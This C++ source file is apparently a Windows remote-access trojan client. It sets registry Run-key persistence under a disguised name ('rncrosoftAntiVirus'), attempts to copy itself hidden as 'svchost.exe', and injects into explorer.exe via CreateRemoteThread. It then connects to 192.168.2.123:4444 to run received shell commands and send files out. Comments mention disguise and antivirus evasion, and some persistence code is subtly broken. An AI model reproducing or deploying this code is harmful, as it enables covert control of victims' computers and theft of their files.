#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <tlhelp32.h>
#include <windows.h>
#include <fstream>
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "ws2_32.lib") // Link with the ws2_32.lib library

bool AddToStartup() {
    HKEY hKey;
    const char* czStartName = "rncrosoftAntiVirus";
    char szPath[MAX_PATH];

    // Get the full path of the current executable
    if (GetModuleFileNameA(NULL, szPath, MAX_PATH) == 0) {
        std::cerr << "Failed to get executable path." << std::endl;
        return false;
    }

    // Open the Run registry key
    LONG result = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_SET_VALUE,
        &hKey
    );

    if (result != ERROR_SUCCESS) {
        std::cerr << "Failed to open registry key. Error: " << result << std::endl;
        return false;
    }

    // Set the value in the registry
    result = RegSetValueExA(
        hKey,
        czStartName,
        0,
        REG_SZ,
        (BYTE*)szPath,
        strlen(szPath) + 1
    );

    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS) {
        std::cerr << "Failed to set registry value. Error: " << result << std::endl;
        return false;
    }

    std::cout << "Successfully added to startup!" << std::endl;
    std::cout << "Registry path: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" << std::endl;
    std::cout << "Entry name: " << czStartName << std::endl;
    return true;
}

// Function to remove from startup (optional)
bool RemoveFromStartup() {
    HKEY hKey;
    const char* czStartName = "MyClientApp";

    LONG result = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_SET_VALUE,
        &hKey
    );

    if (result != ERROR_SUCCESS) {
        return false;
    }

    result = RegDeleteValueA(hKey, czStartName);
    RegCloseKey(hKey);

    return (result == ERROR_SUCCESS);
}

//process injection functions to inject into explorer.exe and find it by Name

DWORD FindProcessId(const std::wstring& processName) {
    PROCESSENTRY32W processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32W);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    if (Process32FirstW(snapshot, &processEntry)) {
        do {
            if (processName == processEntry.szExeFile) {
                CloseHandle(snapshot);
                return processEntry.th32ProcessID;
            }
        } while (Process32NextW(snapshot, &processEntry));
    }

    CloseHandle(snapshot);
    return 0;
}

//check if it's injected
bool IsInjectedIntoExplorer() {
    DWORD currentPid = GetCurrentProcessId();
    DWORD parentPid = 0;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return false;
    }

    PROCESSENTRY32W processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(snapshot, &processEntry)) {
        do {
            if (processEntry.th32ProcessID == currentPid) {
                parentPid = processEntry.th32ParentProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &processEntry));
    }

    //found the parent process name
    if (parentPid != 0) {
        if (Process32FirstW(snapshot, &processEntry)) {
            do {
                if (processEntry.th32ProcessID == parentPid) {
                    CloseHandle(snapshot);
                    //check if parent is explorer.exe
                    return (std::wstring(processEntry.szExeFile) == L"explorer.exe");
                }
            } while (Process32NextW(snapshot, &processEntry));
        }
    }

    CloseHandle(snapshot);
    return false;
}


bool InjectIntoProcess(DWORD processId) {
   
    char szPath[MAX_PATH];

    if (GetModuleFileNameA(NULL, szPath, MAX_PATH) == 0) {
        std::cerr << "Failed to get executable path." << std::endl;
        return false;
    }

    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        processId
    );

    if (hProcess == NULL) {
        std::cerr << "Failed to open target process. Error: " << GetLastError() << std::endl;
        return false;
    }

    LPVOID pRemoteMemory = VirtualAllocEx( //memory allocate
        hProcess,
        NULL,
        strlen(szPath) + 1,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (pRemoteMemory == NULL) {
        std::cerr << "Failed to allocate memory in target process. Error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    if (!WriteProcessMemory(hProcess, pRemoteMemory, szPath, strlen(szPath) + 1, NULL)) {
        std::cerr << "Failed to write to process memory. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA"); //get address
    if (pLoadLibrary == NULL) {
        std::cerr << "Failed to get LoadLibraryA address." << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary,
        pRemoteMemory,
        0,
        NULL
    );

    if (hThread == NULL) {
        std::cerr << "Failed to create remote thread. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    std::cout << "Successfully injected into process!" << std::endl;
    std::cout << "Process ID: " << processId << std::endl;

    WaitForSingleObject(hThread, INFINITE);


    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return true;
}

//copy executable to Windows directory and create scheduled task
bool SetupPersistenceWithInjection() {
    if (IsInjectedIntoExplorer()) {
        std::cout << "Already running inside explorer.exe, skipping injection." << std::endl;
        return true;
    }
    char szCurrentPath[MAX_PATH];
    char szTargetPath[MAX_PATH];

    //Get current executable path
    if (GetModuleFileNameA(NULL, szCurrentPath, MAX_PATH) == 0) {
        std::cout << "returnd from here lol" << std::endl;
        return false;
    }
    strcat_s(szTargetPath, "C:\\svchost.exe"); //disguise LoL
    //Copy to Windows directory with hidden name
    GetWindowsDirectoryA(szTargetPath, MAX_PATH);
    

    //copy file if not there
    if (GetFileAttributesA(szTargetPath) == INVALID_FILE_ATTRIBUTES) {
        if (!CopyFileA(szCurrentPath, szTargetPath, FALSE)) {
            std::cerr << "Failed to copy file. Error: " << GetLastError() << std::endl; //failed to run with AV survilliance, root priviledge needed! well honestly me somehow cant byPass iT
            return false;
        }

        //set file as hidden and system
        SetFileAttributesA(szTargetPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

        std::cout << "Copied executable to: " << szTargetPath << std::endl;
    }

    DWORD explorerPid = FindProcessId(L"explorer.exe");
    if (explorerPid == 0) {
        std::cerr << "Failed to find explorer.exe" << std::endl;
        return false;
    }

    std::cout << "Found explorer.exe with PID: " << explorerPid << std::endl;

    return InjectIntoProcess(explorerPid);
}

std::string exec(const char* cmd) {

    FILE* pipe = nullptr;


#ifdef _WIN32
    pipe = _popen(cmd, "r");
#else
    pipe = popen(cmd, "r");
#endif
    if (!pipe) {
        throw std::runtime_error("Failed to execute command via popen/ _popen!");
    }

    char buffer[128];
    std::string result = "";

    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }


    int status = -1;
#ifdef _WIN32
    status = _pclose(pipe);
#else
    status = pclose(pipe);
#endif

    if (status == -1) {
        //whatever
    }

    return result;
} //cmd execution
std::string firstWord(std::string sentence)
{
    size_t spacePos = sentence.find(' ');
    std::string firstWord;
    if (spacePos != std::string::npos) {
        firstWord = sentence.substr(0, spacePos);
    }
    else {
        firstWord = sentence;
    }
    return firstWord;
}
std::string stripFirstWord(std::string sentence, std::string firstWord) {
    if (sentence.length() <= firstWord.length()) {
        return "";
    }
    size_t startPos = firstWord.length();
    if (startPos < sentence.length() && sentence[startPos] == ' ') {
        startPos++; // Move past the space
    }
    return sentence.substr(startPos);
}

// Function to send a file, -1 means cant open file or error, 0 means OK
int fileSend(const char* filePath, SOCKET transferSocket) {
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file) {
        std::cerr << "Error: Could not open file." << std::endl;
        return -1;
    }

    int fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    // Send the file size first
    if (send(transferSocket, (char*)&fileSize, sizeof(int), 0) == SOCKET_ERROR) {
        std::cerr << "Send file size failed." << std::endl;
        return -1;
    }

    // Send the file content
    char buffer[1024];
    while (file.read(buffer, sizeof(buffer))) {
        send(transferSocket, buffer, file.gcount(), 0);
    }
    send(transferSocket, buffer, file.gcount(), 0); // Send the last chunk

    file.close();
    std::cout << "File '" << filePath << "' sent successfully." << std::endl;
    return 0;
}
int main() {

    AddToStartup(); //add Auto-start using registry
    std::cout << "Setting up persistence via process injection..." << std::endl;
    SetupPersistenceWithInjection(); //process injection
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed." << std::endl;
        return 1;
    }

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Error creating socket." << std::endl;
        // ... (cleanup and exit)
    }

    sockaddr_in serverAddr = {};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(4444);

    // Check if the IP address is valid first
    if (inet_pton(AF_INET, "192.168.2.123", &serverAddr.sin_addr) <= 0) {
        std::cerr << "Invalid IP address." << std::endl;
        closesocket(clientSocket);
        return 1;
    }

    const int MAX_RETRIES = 7;
    const int RETRY_DELAY_MS = 500;
    int retryCount = 0;

    // This is the correct location for the retry loop
    while (retryCount < MAX_RETRIES) {
        std::cout << "Attempting to connect (attempt " << (retryCount + 1) << "/" << MAX_RETRIES << ")..." << std::endl;

        // Attempt to connect
        if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) != SOCKET_ERROR) {
            std::cout << "Connected to the server successfully!" << std::endl;
            break; // Exit the loop on success
        }

        // Connection failed, close the socket and prepare for retry
        std::cerr << "Connection failed. Error code: " << WSAGetLastError() << std::endl;
        closesocket(clientSocket);
        clientSocket = INVALID_SOCKET; // Reset the socket handle

        retryCount++;

        if (retryCount < MAX_RETRIES) {
            std::cerr << "Waiting 0.5 seconds before retrying..." << std::endl;
            Sleep(RETRY_DELAY_MS);

            // Re-create the socket for the next attempt
            clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (clientSocket == INVALID_SOCKET) {
                std::cerr << "Error re-creating socket." << std::endl;
                break; // Exit the loop if socket creation fails
            }
        }
    }

    if (retryCount >= MAX_RETRIES) {
        std::cerr << "Cannot connect to host after " << MAX_RETRIES << " attempts. Exiting!" << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        std::cout << "Press Enter to exit...";
        std::cin.get();
        return 1;
    }
    
    std::cout << "Connected to the server." << std::endl;

    while (true) {
        // Receive the size of the incoming message
        int networkSize=0;
        int bytesReceived = recv(clientSocket, (char*)&networkSize, sizeof(int), 0);
        if (bytesReceived <= 0) {
            std::cerr << "Connection closed by server or failed to receive message size." << std::endl;
            break;
        }

        int messageSize = ntohl(networkSize);

        // Validate message size to prevent excessive allocation
        if (messageSize <= 0 || messageSize > 1048576) { // Max 1MB
            std::cerr << "Invalid message size: " << messageSize << std::endl;
            break;
        }

        // Receive the actual message
        char* buffer = new char[messageSize + 1];
        memset(buffer, 0, messageSize + 1);

        int totalReceived = 0;
        while (totalReceived < messageSize) {
            bytesReceived = recv(clientSocket, buffer + totalReceived, messageSize - totalReceived, 0);
            if (bytesReceived <= 0) {
                std::cerr << "Failed to receive message data." << std::endl;
                delete[] buffer;
                closesocket(clientSocket);
                WSACleanup();
                return 1;
            }
            totalReceived += bytesReceived;
        }

        std::string receivedMessage(buffer);
        std::cout << "\nReceived message: " << receivedMessage << std::endl;

        // Check if the received message is "Quit"
        if (receivedMessage == "Quit") {
            std::cout << "Quit command received. Closing connection..." << std::endl;
            delete[] buffer;
            break;
        }
        
        if (firstWord(receivedMessage) == "shell")
        {
            try
            {
                std::string realCommand = stripFirstWord(receivedMessage, "shell");
                std::string message = exec(realCommand.c_str());
                while (true) {
                    // Send the size of the message first, so the client knows how much to receive
                    int messageSize = message.length();
                    int networkSize = htonl(messageSize); // Convert to network byte order

                    if (send(clientSocket, (char*)&networkSize, sizeof(int), 0) == SOCKET_ERROR) {
                        std::cerr << "Send size failed. Host may have disconnected." << std::endl;
                        break; // Exit loop on error
                    }

                    // Send the actual message
                    int totalSent = 0;
                    while (totalSent < messageSize) {
                        int sent = send(clientSocket, message.c_str() + totalSent, messageSize - totalSent, 0);
                        if (sent == SOCKET_ERROR) {
                            std::cerr << "Send failed. Client may have disconnected." << std::endl;
                            break;
                        }
                        totalSent += sent;
                    }

                    if (totalSent < messageSize) {
                        break; // Exit if send was incomplete
                    }

                    std::cout << "Message sent successfully." << std::endl;
                    break;
                }
            }
            catch (const std::exception& e)
            {
                std::cerr << "An error has occured at ls" << e.what() << std::endl;
            }
        }
        if (firstWord(receivedMessage) == "download")   //host want to download file from Client, download C:\fuck\fucnyou.cpp
        {
            std::string filePath=stripFirstWord(receivedMessage.c_str(),"download");
            size_t lastSlash = filePath.find_last_of("\\/");
            std::string filename = (lastSlash == std::string::npos) ? filePath : filePath.substr(lastSlash + 1);
            send(clientSocket, filename.c_str(), filename.length(), 0);
            const short int RESULT = fileSend(filePath.c_str(), clientSocket);
            if (RESULT == 0)
            {
                int totalSent = 0;
                std::string message = "Sent complete";
                while (totalSent < messageSize) {
                    int sent = send(clientSocket, message.c_str() + totalSent, messageSize - totalSent, 0);
                    if (sent == SOCKET_ERROR) {
                        std::cerr << "Send failed. Client may have disconnected." << std::endl;
                        break;
                    }
                    totalSent += sent;
                }

                if (totalSent < messageSize) {
                    break; // Exit if send was incomplete
                }
            }
            else
            {
                int totalSent = 0;
                std::string message = "failed to send!";
                while (totalSent < messageSize) {
                    int sent = send(clientSocket, message.c_str() + totalSent, messageSize - totalSent, 0);
                    if (sent == SOCKET_ERROR) {
                        std::cerr << "Send failed. Client may have disconnected." << std::endl;
                        break;
                    }
                    totalSent += sent;
                }

                if (totalSent < messageSize) {
                    break; // Exit if send was incomplete
                }
            }
        }
        delete[] buffer;
    }

    closesocket(clientSocket);
    WSACleanup();
    return 0;
}

